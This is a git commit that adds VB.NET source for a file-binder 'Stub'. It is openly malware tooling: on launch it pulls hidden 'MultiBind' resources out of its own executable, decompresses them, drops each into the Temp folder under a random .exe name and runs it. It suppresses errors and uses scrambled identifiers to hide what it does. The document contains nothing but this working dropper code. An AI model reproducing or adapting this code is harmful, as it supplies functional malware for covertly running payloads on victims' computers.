715bb0afc744d3888e0d20e59a9c045b0a34e227
roast247 <77567356+roast247@users.noreply.github.com>
2021-03-16 00:15:55 -0700

    Add files via upload

---
+++ Stub/Stub/Form1.vb
@@ -0,0 +1,29 @@
+﻿Imports System.Text
+Imports System.IO
+
+Public Class Form1
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        On Error Resume Next
+        Dim N As Integer = Encoding.UTF7.GetString(DtXErddcUVsV.znKEdivzxWDV(Application.ExecutablePath, 1))
+        For i = 0 To N - 1
+            Dim Target As String = My.Computer.FileSystem.SpecialDirectories.Temp & "\"
+            Dim FileN As String = GenStr(35)
+            File.WriteAllBytes(Target & FileN & ".exe", DtXErddcUVsV.Decompress(DtXErddcUVsV.znKEdivzxWDV(Application.ExecutablePath, i + 2)))
+            Shell(Target & FileN & ".exe")
+        Next
+        End
+    End Sub
+
+    Public Function GenStr(ByVal lenght As Integer) As String
+        Randomize()
+        Dim s As New System.Text.StringBuilder("")
+        Dim b() As Char = "A0B1C2D3E4F5G6H7I8J9KLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray()
+        For i As Integer = 1 To lenght
+            Randomize()
+            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
+            s.Append(b(z))
+        Next
+        Return s.ToString
+    End Function
+End Class
---
+++ Stub/Stub/Module2.vb
@@ -0,0 +1,43 @@
+﻿Imports System.Runtime.InteropServices
+Imports System.IO
+Imports System.IO.Compression
+
+Module DtXErddcUVsV
+    <DllImport("kernel32.dll", SetLastError:=True)>
+    Private Function FindResource(ByVal CvQfufuMNvCq As IntPtr, ByVal lpName As String, ByVal lpType As String) As IntPtr
+    End Function
+    Private Declare Function qHtvrsgOFKQL Lib "kernel32" Alias "GetModuleHandleA" (ByVal moduleName As String) As IntPtr
+    Private Declare Function SizeofResource Lib "kernel32" (ByVal CvQfufuMNvCq As IntPtr, ByVal hResInfo As IntPtr) As Integer
+    Private Declare Function LoadResource Lib "kernel32" (ByVal CvQfufuMNvCq As IntPtr, ByVal hResInfo As IntPtr) As IntPtr
+    Public Function znKEdivzxWDV(ByVal aZEEXIquKhRh As String, ByVal N As Integer) As Byte()
+        Dim CvQfufuMNvCq As IntPtr = qHtvrsgOFKQL(aZEEXIquKhRh)
+        Dim wWFwZldokHN As IntPtr = FindResource(CvQfufuMNvCq, N, "MultiBind")
+        Dim shOphqUnyXvI As IntPtr = LoadResource(CvQfufuMNvCq, wWFwZldokHN)
+        Dim SSHpaPPiKiJT = SizeofResource(CvQfufuMNvCq, wWFwZldokHN)
+        Dim voUQymTANwuc As Byte() = New Byte(SSHpaPPiKiJT - 1) {}
+        Marshal.Copy(shOphqUnyXvI, voUQymTANwuc, 0, CInt(SSHpaPPiKiJT))
+        Return voUQymTANwuc
+    End Function
+
+
+    Public Function Decompress(ByVal bytData() As Byte) As Byte()
+        Using oMS As New MemoryStream(bytData)
+            Using oGZipStream As New GZipStream(oMS, CompressionMode.Decompress)
+                Const CHUNK As Integer = 1024
+                Dim intTotalBytesRead As Integer = 0
+                Do
+                    ReDim Preserve bytData(intTotalBytesRead + CHUNK - 1)
+                    Dim intBytesRead As Integer = oGZipStream.Read(bytData, intTotalBytesRead, CHUNK)
+                    intTotalBytesRead += intBytesRead
+                    If intBytesRead < CHUNK Then
+                        ReDim Preserve bytData(intTotalBytesRead - 1)
+                        Exit Do
+                    End If
+                Loop
+                oGZipStream.Close()
+            End Using
+            oMS.Close()
+        End Using
+        Return bytData
+    End Function
+End Module
